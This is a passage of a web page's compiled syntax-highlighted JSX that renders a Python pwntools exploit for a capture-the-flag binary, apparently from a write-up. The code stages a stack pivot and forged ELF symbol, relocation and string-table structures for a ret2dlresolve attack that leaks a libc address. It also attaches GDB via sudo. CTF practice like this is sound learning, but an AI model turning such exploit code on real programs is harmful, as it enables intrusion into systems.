proc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"stdout\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\n'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tpid \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"''\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" ps\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\t\",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'/home/bacteria/bacteria'\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" i \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"and\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'timeout'\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"not\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" i\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\t\tpid \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" i\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'    '\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'  '\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"decode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\t\tlog\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"info\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'Process pid: '\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"str\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"pid\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tcommand \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`'''\n`})]}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tb*0x401040\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tc\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tc\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tc\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tc\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`set $JMPREL = 0x400300\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`set $SYMTAB = 0x400290\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`set $STRTAB = 0x4002c0\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`set $reloc_arg = 632\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`x/3xg $JMPREL + $reloc_arg*24\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`x/3xg $SYMTAB + ( 0x0000027a00000007 >> 32 )*24\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`x/s $STRTAB + 0x3bc0\n`})}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:\"\t'''\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"with\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"open\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'/tmp/command.gdb'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'wt'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"as\"}),\" f\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t        f\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"write\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"command\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tsubprocess\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"Popen\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'sudo'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'/usr/bin/x-terminal-emulator'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'--geometry'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'960x1080+960+0'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'-e'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'gdb'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'-p'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" pid\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'-x'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'/tmp/command.gdb'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"input\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"         \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# input() to make program wait with gdb\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" connect\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'127.0.0.1'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"9487\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# p = connect('34.81.158.137', 9487)\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# GDB()\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"############################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"### Stage 1: Stack pivot ###\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"############################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x403e00\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"mov_rsi_rbp_read \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x401027\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# rip\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),\"                 \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Just for padding so that we don\\u2019t need to sleep()\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"########################################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"### Stage 2: Fake address and structure of Elf64_Sym ###\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"########################################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"SYMTAB \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400290\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Elf64_Sym_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),` rw_section\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"symbol_number  \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"int\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"Elf64_Sym_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" SYMTAB\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"/\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"24\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_name \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p32\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"15296\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"        \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Change here\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_info \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p8\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x12\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_other \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p8\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_shndx \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p16\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_value \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# st_size is null already because the stack now contain all null byte\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# so we don\\u2019t need to write these variable, just need to pad full 0x10\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# bytes so that we don\\u2019t need to sleep()\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Elf64_Sym_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" st_name \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" st_info \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" st_other \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" st_shndx \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),` st_value\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"#########################################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"### Stage 3: Fake address and structure of Elf64_Rela ###\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"#########################################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"JMPREL \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400300\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Elf64_Rela_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x40\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"reloc_arg \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"int\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"Elf64_Rela_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" JMPREL\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"/\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"24\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"r_offset \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x50\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"         \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Change here\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"r_info \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"symbol_number \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<<\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"32\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x7\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# r_addend is null and stack is null already so we don\\u2019t need to write this,\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# also because we run out of 0x10 bytes we can write\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Elf64_Rela_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" r_offset \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),` r_info\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"#####################################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"### Stage 4: Fake address and structure of STRTAB ###\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"#####################################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STRTAB \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x4002c0\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STRTAB_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x80\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_name \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" STRTAB_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),` STRTAB\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STRTAB_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'b\"write\\\\x00\\\\x00\\\\x00\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STRTAB_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"##########################################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"### Stage 5. Conduct ret2dlresolve & Leak libc address ###\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"##########################################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Write Elf64_Sym structure\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"Elf64_Rela_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp, write and jump to Elf64_Rela address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),` Elf64_Sym_struct\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Write Elf64_Rela structure\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"STRTAB_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"        \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp, write and jump to STRTAB address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),` Elf64_Rela_struct\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Write STRTAB structure\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x50\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"         \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp, write and jump to ret2dlresolve address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),` STRTAB_struct\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# print(reloc_arg)                       # Using GDB to check\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Conduct 